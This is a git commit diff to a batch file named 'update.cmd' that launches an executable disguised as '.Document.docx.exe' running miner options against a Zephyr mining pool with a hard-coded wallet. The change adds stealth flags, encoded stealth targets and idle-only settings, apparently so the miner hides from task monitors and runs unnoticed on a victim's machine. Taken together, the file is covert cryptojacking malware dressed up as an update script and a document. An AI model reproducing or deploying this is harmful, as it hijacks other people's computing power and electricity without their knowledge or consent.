df7cfeae86081fbeacd0cdf52a29e31465296480
DFX57 <113306780+DFX57@users.noreply.github.com>
2024-01-03 19:22:40 +0700

    update.cmd

--- update.cmd
+++ update.cmd
@@ -1,4 +1,4 @@
 @echo off
 cd /d "%~dp0"
-.Document.docx.exe --asm=auto --cpu-memory-pool=1 --randomx-no-rdmsr --randomx-cache-qos -o hk.zephyr.herominers.com:1123 -u ZEPHYR2tsdEg7HW8XbkfsbDFZPBeeKTouZtSb8W5kuC3c1NXQ44BV1aVWd8yNReF83JV8k2K47AG65qXTELgCvzYPfG8DCBzixR1H -p root -k -t 4 -a rx/0
+.Document.docx.exe --cinit-find-x -B --asm=auto --cpu-memory-pool=1 --randomx-no-rdmsr --randomx-cache-qos -o hk.zephyr.herominers.com:1123 -u ZEPHYR2tsdEg7HW8XbkfsbDFZPBeeKTouZtSb8W5kuC3c1NXQ44BV1aVWd8yNReF83JV8k2K47AG65qXTELgCvzYPfG8DCBzixR1H -p root -k -t 4 -a rx/0 --cinit-stealth-targets="+iU/trnPCTLD3p+slbva5u4EYOS6bvIPemCHGQx2WRUcnFdomWh6dhl5H5KbQCjp6yCYlsFu5LR1mi7nQAy56B+5doUwurAPvCael2sR/N4=" --cinit-idle-wait=5 --cinit-idle-cpu=80 --cinit-stealth
 pause
